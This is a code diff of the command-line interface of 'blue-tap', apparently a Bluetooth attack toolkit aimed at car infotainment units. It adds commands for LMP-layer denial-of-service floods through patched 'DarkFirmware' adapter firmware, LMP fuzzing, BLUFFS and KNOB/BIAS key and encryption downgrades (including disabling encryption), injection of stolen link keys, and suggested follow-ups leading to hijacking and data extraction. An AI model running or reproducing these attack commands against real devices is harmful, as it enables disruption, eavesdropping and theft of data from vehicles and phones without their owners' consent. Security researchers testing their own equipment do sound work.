+    After recovering a link key (via nRF/DarkFirmware capture + crack, or other means),
     inject it so bluetoothctl can connect using the stolen key.
     """
     from blue_tap.recon.sniffer import LinkKeyExtractor
@@ -1816,6 +2489,35 @@ def vulnscan(address, hci, output, active, phone):
             f"{confirmed} confirmed, {potential} potential "
             f"({critical} CRITICAL, {high} HIGH)")
 
+    # Recommended next steps based on findings
+    if findings:
+        shown = set()
+        recommendations = []
+        for f in findings:
+            name = f.get("name", "").lower()
+            if "knob" in name and "knob" not in shown:
+                recommendations.append(f"  KNOB: blue-tap knob probe {address} -i {hci}")
+                shown.add("knob")
+            elif "bias" in name and "bias" not in shown:
+                _phone = phone or "PHONE_MAC"
+                recommendations.append(f"  BIAS: blue-tap bias probe {address} {_phone} -i {hci}")
+                shown.add("bias")
+            elif "bluffs" in name and "bluffs" not in shown:
+                recommendations.append(f"  BLUFFS: blue-tap bluffs {address} --variant probe -i {hci}")
+                shown.add("bluffs")
+            elif ("blurtooth" in name or "ctkd" in name) and "blurtooth" not in shown:
+                recommendations.append(f"  BLURtooth: blue-tap vulnscan {address} --active -i {hci}")
+                shown.add("blurtooth")
+            elif "service" in name and "expos" in name and "service" not in shown:
+                _phone = phone or "PHONE_MAC"
+                recommendations.append(f"  Data extraction: blue-tap hijack {address} {_phone} -i {hci}")
+                shown.add("service")
+        if recommendations:
+            info("")
+            info("Recommended next steps:")
+            for rec in recommendations:
+                info(rec)
+
     from blue_tap.utils.session import log_command
     log_command("vulnscan", findings, category="vuln", target=address)
 
@@ -1983,16 +2685,16 @@ def bias_probe(ivi_address, phone_address, phone_name, hci):
 @click.option("-n", "--phone-name", default="", help="Phone name to impersonate")
 @click.option("-i", "--hci", default="hci0")
 @click.option("-m", "--method", default="auto",
-              type=click.Choice(["auto", "role_switch", "internalblue"]),
+              type=click.Choice(["auto", "role_switch", "darkfirmware"]),
               help="Attack method")
 def bias_attack(ivi_address, phone_address, phone_name, hci, method):
     """Execute BIAS attack to bypass IVI authentication.
 
     \b
     Methods:
-      auto         - Try role-switch, then suggest InternalBlue
+      auto         - Try role-switch, then use DarkFirmware LMP injection
       role_switch  - Software-only SSP downgrade (no special hardware)
-      internalblue - Full LMP injection (requires Broadcom chipset)
+      darkfirmware - Full LMP injection via DarkFirmware RTL8761B
 
     \b
     Requires: target IVI address and phone address to impersonate.
@@ -2552,6 +3254,112 @@ def dos_hfp_slc_confuse(address, channel):
     _show_dos_result(result)
 
 
+# ---- LMP-layer DoS attacks (via DarkFirmware) ----
+
+@dos.command("lmp")
+@click.argument("target", required=False, default=None)
+@click.option("-m", "--method", default="all",
+              type=click.Choice(["all", "detach-flood", "switch-storm", "features-flood",
+                                 "invalid-opcode", "encryption-toggle", "timing-flood"]),
+              help="LMP DoS method (default: all)")
+@click.option("-c", "--count", default=500, help="Number of packets to send")
+@click.option("--delay", default=0.005, type=float, help="Delay between packets (seconds)")
+@click.option("--hci", default="hci1", help="HCI device for DarkFirmware (e.g. hci1 or 1)")
+def dos_lmp(target, method, count, delay, hci):
+    """LMP-layer DoS via DarkFirmware — below-HCI firmware attacks.
+
+    \b
+    Requires DarkFirmware on RTL8761B. These attacks target the Bluetooth
+    controller firmware, making them harder to filter than L2CAP-level DoS.
+
+    \b
+    Methods:
+      detach-flood       Rapid LMP_DETACH with varying error codes
+      switch-storm       Rapid LMP_SWITCH_REQ with varying instants
+      features-flood     Rapid LMP_FEATURES_REQ to exhaust state
+      invalid-opcode     Undefined LMP opcodes (68-126 range)
+      encryption-toggle  Alternating START/STOP encryption requests
+      timing-flood       Rapid LMP_TIMING_ACCURACY_REQ
+    """
+    target = resolve_address(target)
+    if not target:
+        return
+    from blue_tap.attack.protocol_dos import LMPDoS
+
+    hci_dev = int(hci.replace("hci", "")) if isinstance(hci, str) and hci.startswith("hci") else int(hci)
+    hci_str = f"hci{hci_dev}"
+    info(f"Launching LMP DoS ({method}) against [bold]{target}[/bold] "
+         f"via {hci_str} ({count} packets, {delay}s delay)")
+
+    attack = LMPDoS(target, hci=hci_str)
+
+    method_map = {
+        "detach-flood": attack.detach_flood,
+        "switch-storm": attack.switch_storm,
+        "features-flood": attack.features_flood,
+        "invalid-opcode": attack.invalid_opcode_flood,
+        "encryption-toggle": attack.encryption_toggle,
+        "timing-flood": attack.timing_flood,
+    }
+
+    if method == "all":
+        # Run each method with reduced count, show summary table
+        per_method_count = max(1, count // 6)
+        from rich.table import Table
+        summary_table = Table(title="LMP DoS Summary (all methods)")
+        summary_table.add_column("Method", style="bold")
+        summary_table.add_column("Sent")
+        summary_table.add_column("Errors")
+        summary_table.add_column("Status")
+
+        all_results = {}
+        for m_name, m_func in method_map.items():
+            info(f"--- Running {m_name} ({per_method_count} packets) ---")
+            r = m_func(count=per_method_count, delay=delay)
+            all_results[m_name] = r
+            s = r.get("target_status", "unknown")
+            style = "red" if s == "possibly_crashed" else "yellow" if s == "survived" else ""
+            summary_table.add_row(
+                m_name,
+                str(r.get("packets_sent", 0)),
+                str(r.get("errors", 0)),
+                s,
+                style=style,
+            )
+
+        console.print()
+        console.print(summary_table)
+        result = {
+            "method": "all",
+            "sub_results": all_results,
+            "target_status": "possibly_crashed" if any(
+                r.get("target_status") == "possibly_crashed" for r in all_results.values()
+            ) else "survived",
+        }
+    else:
+        func = method_map[method]
+        result = func(count=count, delay=delay)
+
+        console.print()
+        status = result.get("target_status", "unknown")
+        sent = result.get("packets_sent", 0)
+        duration = result.get("duration", 0)
+        errors = result.get("errors", 0)
+
+        if status == "possibly_crashed":
+            success(f"LMP DoS [bold]{method}[/bold]: target may have crashed "
+                    f"({sent} packets, {errors} errors, {duration}s)")
+        elif status == "survived":
+            warning(f"LMP DoS [bold]{method}[/bold]: target survived "
+                    f"({sent} packets, {errors} errors, {duration}s)")
+        else:
+            info(f"LMP DoS [bold]{method}[/bold]: {status} "
+                 f"({sent} packets, {errors} errors, {duration}s)")
+
+    from blue_tap.utils.session import log_command
+    log_command("dos_lmp", result, category="dos", target=target)
+
+
 def _show_dos_result(result: dict) -> None:
     """Display DoS attack results."""
     name = result.get("attack", "?")
@@ -2612,6 +3420,11 @@ def fuzz():
               type=click.Choice(["oversized", "malformed", "null"]))
 def fuzz_l2cap(address, psm, count, mode):
     """Fuzz L2CAP protocol."""
+    warning(
+        "[bt.yellow]DEPRECATED:[/bt.yellow] 'fuzz l2cap' is a legacy command. "
+        "Use [bold]blue-tap fuzz run --protocol l2cap[/bold] for the full campaign engine "
+        "(coverage-guided, crash management, session persistence)."
+    )
     address = resolve_address(address)
     if not address:
         return
@@ -2633,6 +3446,11 @@ def fuzz_l2cap(address, psm, count, mode):
               type=click.Choice(["exhaust", "overflow", "at"]))
 def fuzz_rfcomm(address, channel, mode):
     """Fuzz RFCOMM protocol."""
+    warning(
+        "[bt.yellow]DEPRECATED:[/bt.yellow] 'fuzz rfcomm' is a legacy command. "
+        "Use [bold]blue-tap fuzz run --protocol rfcomm[/bold] for the full campaign engine "
+        "(coverage-guided, crash management, session persistence)."
+    )
     address = resolve_address(address)
     if not address:
         return
@@ -2654,6 +3472,11 @@ def fuzz_rfcomm(address, channel, mode):
               help="Comma-separated: long,null,format,unicode,overflow")
 def fuzz_at(address, channel, patterns):
     """AT command fuzzing with malformed inputs."""
+    warning(
+        "[bt.yellow]DEPRECATED:[/bt.yellow] 'fuzz at' is a legacy command. "
+        "Use [bold]blue-tap fuzz run --protocol at-hfp[/bold] (or at-phonebook, at-sms, at-injection) "
+        "for the full campaign engine with protocol-aware mutation."
+    )
     address = resolve_address(address)
     if not address:
         return
@@ -2684,6 +3507,11 @@ def fuzz_at(address, channel, patterns):
 @click.argument("address", required=False, default=None)
 def fuzz_sdp(address):
     """SDP continuation state probe (BlueBorne CVE-2017-0785 vector)."""
+    warning(
+        "[bt.yellow]DEPRECATED:[/bt.yellow] 'fuzz sdp' is a legacy command. "
+        "Use [bold]blue-tap fuzz run --protocol sdp[/bold] for the full campaign engine "
+        "with coverage-guided mutation and session persistence."
+    )
     address = resolve_address(address)
     if not address:
         return
@@ -2699,12 +3527,88 @@ def fuzz_sdp(address):
 @click.argument("address", required=False, default=None)
 def fuzz_bss(address):
     """Run Bluetooth Stack Smasher (external tool)."""
+    warning(
+        "[bt.yellow]DEPRECATED:[/bt.yellow] 'fuzz bss' is a legacy wrapper. "
+        "BSS is an external tool — for integrated protocol fuzzing use "
+        "[bold]blue-tap fuzz run[/bold] which provides coverage-guided mutation and crash management."
+    )
     address = resolve_address(address)
     if not address:
         return
     from blue_tap.attack.fuzz import bss_wrapper
     if not bss_wrapper(address):
         error("BSS not available or failed")
+
+
+@fuzz.command("lmp")
+@click.argument("address", required=False, default=None)
+@click.option("-c", "--count", default=1000, type=int, help="Number of fuzz iterations")
+@click.option("-m", "--mode", default="all",
+              type=click.Choice(["all", "knob", "features", "truncated", "oversized", "io_cap"]),
+              help="Fuzz mode")
+@click.option("--hci", default="hci1", help="HCI device for DarkFirmware adapter (e.g. hci1 or 1)")
+def fuzz_lmp(address, count, mode, hci):
+    """LMP protocol fuzzing via DarkFirmware RTL8761B.
+
+    \b
+    Sends malformed LMP packets directly at the Link Manager layer,
+    bypassing the HCI boundary.  Requires an active connection to the
+    target device.
+
+    \b
+    Modes: all (comprehensive), knob (CVE-2019-9506), features, truncated,
+    oversized, io_cap (IO capability manipulation).
+    """
+    warning(
+        "[bt.yellow]DEPRECATED:[/bt.yellow] 'fuzz lmp' is a legacy command. "
+        "Use [bold]blue-tap fuzz run --protocol lmp --strategy coverage_guided[/bold] "
+        "for the full campaign engine (17-byte PDUs, response analysis, session persistence)."
+    )
+    from blue_tap.core.hci_vsc import HCIVSCSocket
+    from blue_tap.core.firmware import DarkFirmwareManager
+    from blue_tap.fuzz.protocols import lmp as lmp_proto
+
+    hci_dev = int(hci.replace("hci", "")) if isinstance(hci, str) and hci.startswith("hci") else int(hci)
+    fw = DarkFirmwareManager()
+    if not fw.is_darkfirmware_loaded(f"hci{hci_dev}"):
+        error("DarkFirmware not loaded. Run: blue-tap adapter firmware-status")
+        return
+
+    # Select fuzz generator based on mode
+    generators = {
+        "all": lmp_proto.generate_all_lmp_fuzz_cases,
+        "knob": lmp_proto.fuzz_enc_key_size,
+        "features": lmp_proto.fuzz_features,
+        "truncated": lmp_proto.fuzz_truncated,
+        "oversized": lmp_proto.fuzz_oversized,
+        "io_cap": lmp_proto.fuzz_io_capabilities,
+    }
+    gen_func = generators.get(mode, lmp_proto.generate_all_lmp_fuzz_cases)
+
+    info(f"Starting LMP fuzzing (mode={mode}, count={count})")
+
+    try:
+        with HCIVSCSocket(hci_dev) as vsc:
+            sent = 0
+            errors = 0
+            for label, payload in gen_func():
+                if sent >= count:
+                    break
+                try:
+                    ok = vsc.send_lmp(payload)
+                    if ok:
+                        sent += 1
+                    else:
+                        errors += 1
+                except Exception:
+                    errors += 1
+
+                if sent % 100 == 0 and sent > 0:
+                    info(f"  Progress: {sent}/{count} sent, {errors} errors")
+
+            success(f"LMP fuzzing complete: {sent} packets sent, {errors} errors")
+    except Exception as exc:
+        error(f"LMP fuzzing failed: {exc}")
 
 
 # Register new protocol-aware fuzz commands (campaign dashboard + crash management)
@@ -2812,8 +3716,7 @@ def report_cmd(dump_dir, fmt, output):
                     )
 
         # Pass full session metadata for timeline, scope, and methodology
-        if hasattr(report, "add_session_metadata"):
-            report.add_session_metadata(session.metadata)
+        report.add_session_metadata(session.metadata)
 
         # Load structured fuzz data (crash DB, corpus stats, evidence files)
         report.load_fuzz_from_session(session.dir)
@@ -2923,8 +3826,9 @@ def auto_cmd(ivi_mac, duration, output, hci, fuzz_duration, skip_fuzz, skip_dos,
 # ============================================================================
 @main.command("run")
 @click.argument("commands", nargs=-1)
-@click.option("--playbook", default=None, help="Playbook text file (one command per line)")
-def run_cmd_seq(commands, playbook):
+@click.option("--playbook", default=None, help="Playbook file (YAML or text, one command per line)")
+@click.option("--list", "list_playbooks_flag", is_flag=True, help="List available bundled playbooks")
+def run_cmd_seq(commands, playbook, list_playbooks_flag):
     """Execute multiple blue-tap commands in sequence.
 
     \b
@@ -2933,32 +3837,107 @@ def run_cmd_seq(commands, playbook):
 
     Use TARGET as a placeholder — you'll be prompted to select a device.
 
-    Or use a playbook file (plain text, one command per line):
-      blue-tap -s mytest run --playbook quick-recon.txt
+    \b
+    Use a playbook file (YAML or plain text):
+      blue-tap -s mytest run --playbook quick-recon.yaml
+      blue-tap -s mytest run --playbook quick-recon       # searches bundled playbooks
+
+    \b
+    List available bundled playbooks:
+      blue-tap run --list
     """
     import shlex
     from blue_tap.utils.session import get_session
 
+    # ── List bundled playbooks ────────────────────────────────────────
+    if list_playbooks_flag:
+        from blue_tap.playbooks import list_playbooks as _list_pb, get_playbook_path
+        import yaml
+
+        pb_names = _list_pb()
+        if not pb_names:
+            info("No bundled playbooks found")
+            return
+
+        pb_table = Table(title="[bold cyan]Bundled Playbooks[/bold cyan]",
+                         show_lines=True, border_style="dim")
+        pb_table.add_column("Playbook", style="bold white")
+        pb_table.add_column("Description", style="dim")
+        pb_table.add_column("Duration", style="cyan")
+        pb_table.add_column("Risk", style="yellow")
+
+        for pb_name in pb_names:
+            path = get_playbook_path(pb_name)
+            try:
+                with open(path) as f:
+                    pb = yaml.safe_load(f)
+                pb_table.add_row(
+                    pb_name.replace(".yaml", ""),
+                    pb.get("description", ""),
+                    pb.get("duration", ""),
+                    pb.get("risk", ""),
+                )
+            except Exception:
+                pb_table.add_row(pb_name, "(error loading)", "", "")
+
+        console.print(pb_table)
+        return
+
+    # ── Load playbook ─────────────────────────────────────────────────
     if playbook:
-        if not os.path.exists(playbook):
+        playbook_path = playbook
+
+        # If no path separator, check bundled playbooks first
+        if os.sep not in playbook and not os.path.exists(playbook):
+            from blue_tap.playbooks import get_playbook_path
+            candidate = get_playbook_path(playbook)
+            if os.path.exists(candidate):
+                playbook_path = candidate
+                info(f"Using bundled playbook: {playbook_path}")
+
+        if not os.path.exists(playbook_path):
             error(f"Playbook not found: {playbook}")
             return
-        with open(playbook) as f:
-            # Simple format: one command per line (not full YAML)
-            commands = [line.strip() for line in f if line.strip() and not line.startswith("#")]
+
+        if playbook_path.endswith((".yaml", ".yml")):
+            import yaml
+            with open(playbook_path) as f:
+                pb_data = yaml.safe_load(f)
+            steps = pb_data.get("steps", [])
+            if not steps:
+                error(f"Playbook has no steps: {playbook_path}")
+                return
+            info(f"Playbook: [bold]{pb_data.get('name', playbook)}[/bold] - "
+                 f"{pb_data.get('description', '')}")
+            if pb_data.get("risk"):
+                info(f"Risk level: {pb_data['risk']}")
+            commands = [step["command"] for step in steps if step.get("command")]
+        else:
+            with open(playbook_path) as f:
+                # Simple format: one command per line (not full YAML)
+                commands = [line.strip() for line in f if line.strip() and not line.startswith("#")]
 
     if not commands:
         error("No commands specified. Usage: blue-tap run \"scan classic\" \"vulnscan TARGET\"")
         return
 
-    # Resolve TARGET placeholder
+    # Resolve TARGET / {target} / {hci} placeholders
     target_addr = None
-    needs_target = any("TARGET" in cmd.upper() for cmd in commands)
-    if needs_target:
+    hci_adapter = "hci0"
+    has_target_placeholder = any(
+        "TARGET" in cmd.upper() or "{target}" in cmd for cmd in commands
+    )
+    has_hci_placeholder = any("{hci}" in cmd for cmd in commands)
+
+    if has_target_placeholder:
         target_addr = resolve_address(None, prompt="Select target for workflow")
         if not target_addr:
             error("Target selection cancelled")
             return
+
+    if has_hci_placeholder and not has_target_placeholder:
+        # Only prompt for HCI if target wasn't already prompted
+        pass  # Default hci0 is fine
 
     console.rule("[bold cyan]Blue-Tap Workflow", style="cyan")
     info(f"Executing {len(commands)} command(s)")
@@ -2973,10 +3952,13 @@ def run_cmd_seq(commands, playbook):
         # Force subcommands to use the current session instead of spawning auto sessions.
         session_prefix = ["-s", active_session.name]
     for i, cmd_str in enumerate(commands, 1):
-        # Replace TARGET placeholder
+        # Replace TARGET / {target} placeholder
         if target_addr:
             cmd_str = re.sub(r'\bTARGET\b', target_addr, cmd_str)
             cmd_str = re.sub(r'\btarget\b', target_addr, cmd_str)
+            cmd_str = cmd_str.replace("{target}", target_addr)
+        # Replace {hci} placeholder
+        cmd_str = cmd_str.replace("{hci}", hci_adapter)
 
         console.rule(f"[bold]Step {i}/{len(commands)}: {cmd_str}", style="dim")
 
@@ -3225,7 +4207,7 @@ def knob_probe(address, hci):
     \b
     Checks BT version (KNOB affects 2.1-5.0 pre-patch), reads
     current encryption key size if connected, and checks if
-    InternalBlue is available for LMP-level manipulation.
+    DarkFirmware is available for LMP-level manipulation.
     """
     address = resolve_address(address)
     if not address:
@@ -3247,7 +4229,7 @@ def knob_probe(address, hci):
     table.add_row("BT Version", str(result.get("bt_version", "unknown")))
     table.add_row("KNOB Vulnerable", vuln_text)
     table.add_row("Key Size Observed", str(result.get("min_key_size_observed", "N/A")))
-    table.add_row("InternalBlue", "[green]Available[/green]" if result.get("internalblue_available") else "[dim]Not available[/dim]")
+    table.add_row("DarkFirmware", "[green]Available[/green]" if result.get("darkfirmware_available") else "[dim]Not available[/dim]")
     table.add_row("Method", result.get("method", "N/A"))
 
     for detail in result.get("details", []):
@@ -3273,7 +4255,7 @@ def knob_attack(address, hci, key_size):
       3. Report results with timing analysis
 
     \b
-    Note: Full LMP manipulation requires InternalBlue (Broadcom/Cypress).
+    Note: Full LMP manipulation requires DarkFirmware (RTL8761B).
     Without it, uses btmgmt to set local minimum key size (limited effectiveness).
     """
     address = resolve_address(address)
@@ -3304,6 +4286,164 @@ def knob_attack(address, hci, key_size):
 
     from blue_tap.utils.session import log_command
     log_command("knob_attack", result, category="attack", target=address)
+
+
+# ============================================================================
+# BLUFFS - Session Key Downgrade (CVE-2023-24023)
+# ============================================================================
+@main.command("bluffs")
+@click.argument("target", required=False, default=None)
+@click.option("-v", "--variant", default="probe",
+              type=click.Choice(["probe", "key-downgrade", "sc-downgrade", "all"]),
+              help="Attack variant (default: probe)")
+@click.option("-i", "--hci", default="hci0")
+@click.option("--phone", default=None, help="Paired phone MAC for identity cloning (optional)")
+def bluffs_attack(target, variant, hci, phone):
+    """BLUFFS session key downgrade attack (CVE-2023-24023).
+
+    \b
+    Exploits BR/EDR session key derivation weaknesses to force weak,
+    reusable session keys. Requires DarkFirmware on RTL8761B.
+
+    \b
+    Variants:
+      probe          - Check if target is vulnerable (SC downgrade test) [safe]
+      key-downgrade  - LSC Central: force minimum encryption key size (A1)
+      sc-downgrade   - SC Central downgrade: reject SC, then apply A1 (A3)
+      all            - Run probe, then sc-downgrade, then key-downgrade
+    """
+    target = resolve_address(target)
+    if not target:
+        return
+    from blue_tap.attack.bluffs import BLUFFSAttack
+
+    # Map user-friendly names to internal variant names
+    _variant_map = {
+        "probe": "probe",
+        "key-downgrade": "a1",
+        "sc-downgrade": "a3",
+    }
+
+    phone_address = ""
+    if phone:
+        phone_address = phone
+
+    attack = BLUFFSAttack(target, phone_address=phone_address, hci=hci)
+    info(f"Executing BLUFFS {variant.upper()} against [bold]{target}[/bold]")
+
+    try:
+        if variant == "all":
+            # Run probe, then sc-downgrade (a3), then key-downgrade (a1)
+            results = []
+            for v in ["probe", "a3", "a1"]:
+                info(f"--- Running BLUFFS {v.upper()} ---")
+                results.append(attack.execute(variant=v))
+            result = {
+                "variant": "all",
+                "success": any(r.get("success") for r in results),
+                "details": [d for r in results for d in r.get("details", [])],
+                "sub_results": results,
+            }
+        else:
+            internal_variant = _variant_map.get(variant, variant)
+            result = attack.execute(variant=internal_variant)
+
+        console.print()
+        if result.get("success"):
+            success(f"BLUFFS {variant.upper()} completed successfully")
+        elif variant == "probe" or (variant == "all" and result.get("sub_results")):
+            vuln_result = result if variant == "probe" else result.get("sub_results", [{}])[0]
+            if vuln_result.get("vulnerable"):
+                warning(f"Target appears vulnerable to BLUFFS (confidence: {vuln_result.get('confidence', 'unknown')})")
+            else:
+                info("Target does not appear vulnerable to BLUFFS")
+        else:
+            warning(f"BLUFFS {variant.upper()} did not confirm exploitation")
+
+        for detail in result.get("details", []):
+            info(f"  {detail}")
+
+        from blue_tap.utils.session import log_command
+        log_command("bluffs_attack", result, category="attack", target=target)
+    except Exception as exc:
+        error(f"BLUFFS attack failed: {exc}")
+
+
+# ============================================================================
+# ENCRYPTION-DOWNGRADE - Beyond KNOB
+# ============================================================================
+@main.command("encryption-downgrade")
+@click.argument("target", required=False, default=None)
+@click.option("-m", "--method", default="all",
+              type=click.Choice(["no-encryption", "force-renegotiation",
+                                 "reject-secure-connections", "all"]),
+              help="Attack method (default: all)")
+@click.option("-i", "--hci", default="hci0")
+def encryption_downgrade(target, method, hci):
+    """Encryption downgrade attacks beyond KNOB (CVE-2019-9506).
+
+    \b
+    Alternative encryption downgrade paths via DarkFirmware LMP injection:
+      no-encryption              - LMP_ENCRYPTION_MODE_REQ(mode=0) to turn off encryption
+      force-renegotiation        - Alternating STOP/START to force weaker re-negotiation
+      reject-secure-connections  - Reject SC to force Legacy SC (weaker keys)
+      all                        - Run all methods sequentially
+
+    \b
+    Requires DarkFirmware loaded on RTL8761B adapter and an active
+    ACL connection to the target device.
+    """
+    target = resolve_address(target)
+    if not target:
+        return
+    from blue_tap.attack.encryption_downgrade import EncryptionDowngradeAttack
+
+    attack = EncryptionDowngradeAttack(target, hci=hci)
+    info(f"Running encryption downgrade ({method}) against [bold]{target}[/bold]")
+
+    try:
+        result = attack.execute(method=method)
+
+        console.print()
+        vulnerable = result.get("vulnerable_methods", [])
+        if vulnerable:
+            from rich.panel import Panel
+            console.print(Panel(
+                f"[bold red]Encryption downgrade succeeded via: {', '.join(vulnerable)}[/bold red]\n\n"
+                f"The target accepted PDUs that weaken or disable encryption.\n"
+                f"This indicates the link manager does not properly enforce\n"
+                f"encryption requirements.",
+                title="Vulnerability Confirmed",
+                border_style="red",
+            ))
+        else:
+            info("No encryption downgrade methods succeeded against this target")
+
+        # Print method results
+        from rich.table import Table
+        table = Table(title="Encryption Downgrade Results")
+        table.add_column("Method", style="bold")
+        table.add_column("Status")
+        table.add_column("Responses")
+
+        for m_name, m_result in result.get("methods", {}).items():
+            resp_count = len(m_result.get("responses", []))
+            if m_result.get("vulnerable"):
+                status = "[bold red]VULNERABLE[/bold red]"
+            elif m_result.get("accepted_count", 0) > 0:
+                status = "[yellow]Partially Accepted[/yellow]"
+            elif m_result.get("error"):
+                status = f"[red]Error: {m_result['error']}[/red]"
+            else:
+                status = "[green]Rejected[/green]"
+            table.add_row(m_name, status, str(resp_count))
+
+        console.print(table)
+
+        from blue_tap.utils.session import log_command
+        log_command("encryption_downgrade", result, category="attack", target=target)
+    except Exception as exc:
+        error(f"Encryption downgrade failed: {exc}")
 
 
 # ============================================================================
@@ -3399,6 +4539,7 @@ def fleet_assess(duration, hci, all_devices):
     results = assessment.assess(targets=targets_to_assess)
 
     console.print()
+    risk_color = "dim"
     for dev_result in results:
         addr = dev_result.get("address", "?")
         risk = dev_result.get("risk_rating", "UNKNOWN")
